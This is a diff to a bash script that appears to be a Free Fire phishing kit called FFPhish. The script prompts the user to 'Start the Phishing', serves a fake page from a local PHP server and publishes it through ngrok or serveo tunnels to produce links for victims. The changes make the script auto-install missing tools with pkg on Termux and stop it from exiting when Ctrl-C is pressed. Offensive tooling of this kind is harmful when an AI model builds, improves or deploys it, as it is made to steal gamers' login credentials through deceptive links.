@@ -5,7 +5,7 @@
 
 
 
-#trap 'printf "\n";stop1;exit 1' 2
+trap 'printf "\n";stop1' 2
 
 #server = "FF"
 
@@ -22,7 +22,7 @@ command -v lynx > /dev/null 2>&1 || { echo >&2 "I require lynx but it's not inst
 menu() {
 
 
-printf "\e[1;91m  Instructions:  \n[1] You must have install php, curl, lynx and ngrok or serveo.net \n[2] If not then this script can not generate the links. \n[3] Ngrok or Serveo must be placed in the same folder in which freeire.sh is exists.\n\e[0m \n"
+printf "\e[1;91m  Instructions:  \n[1] You must have install php, curl, lynx and ngrok or serveo.net \n[2] If not then this script can not generate the links. \n[3] Ngrok or Serveo must be placed in the same folder in which FFPhish folder is .\n\e[0m \n"
 read -p $'\e[1;93m[\e[1;92m*\e[1;93m]\e[1;92m Start the Phishing (Y/n): \e[0m' option
 
 
@@ -206,7 +206,7 @@ printf "\e[1;92m[\e[0m*\e[1;92m] Starting php server...\n"
 cd $server && php -S 127.0.0.1:$port > /dev/null 2>&1 & 
 sleep 2
 printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Starting server...\e[0m\n"
-command -v ssh > /dev/null 2>&1 || { echo >&2 "I require SSH but it's not installed. Install it. Aborting."; exit 1; }
+command -v ssh > /dev/null 2>&1 || { echo >&2 "I require SSH but it's not installed. Install it. Installing."; pkg install ssh -y; }
 if [[ -e sendlink ]]; then
 rm -rf sendlink
 fi
@@ -263,8 +263,8 @@ cd ..
 if [[ -e ngrok ]]; then
 echo ""
 else
-command -v unzip > /dev/null 2>&1 || { echo >&2 "I require unzip but it's not installed. Install it. Aborting."; exit 1; }
-command -v wget > /dev/null 2>&1 || { echo >&2 "I require wget but it's not installed. Install it. Aborting."; exit 1; }
+command -v unzip > /dev/null 2>&1 || { echo >&2 "I require unzip but it's not installed. Install it. Installing."; pkg install unzip -y }
+command -v wget > /dev/null 2>&1 || { echo >&2 "I require wget but it's not installed. Install it. Installing."; pkg install wget -y }
 printf "\e[1;92m[\e[0m*\e[1;92m] Downloading Ngrok...\n"
 arch=$(uname -a | grep -o 'arm' | head -n1)
 arch2=$(uname -a | grep -o 'Android' | head -n1)
